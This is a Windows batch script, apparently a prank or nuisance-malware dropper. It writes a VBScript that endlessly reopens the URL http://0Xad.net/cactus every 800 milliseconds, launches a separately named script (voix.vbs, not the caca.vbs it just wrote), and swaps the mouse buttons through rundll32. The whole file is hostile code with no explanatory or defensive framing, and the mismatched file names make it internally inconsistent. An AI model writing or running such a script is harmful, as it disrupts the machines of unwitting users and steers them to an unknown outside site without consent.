@echo off

cd /d "%~dp0"
echo do>caca.vbs
echo CreateObject("WScript.Shell").Run "http://0Xad.net/cactus">>caca.vbs 
echo WScript.Sleep 800>>caca.vbs
echo loop>>caca.vbs
start voix.vbs
rundll32 user32.dll, SwapMouseButton >nul
exit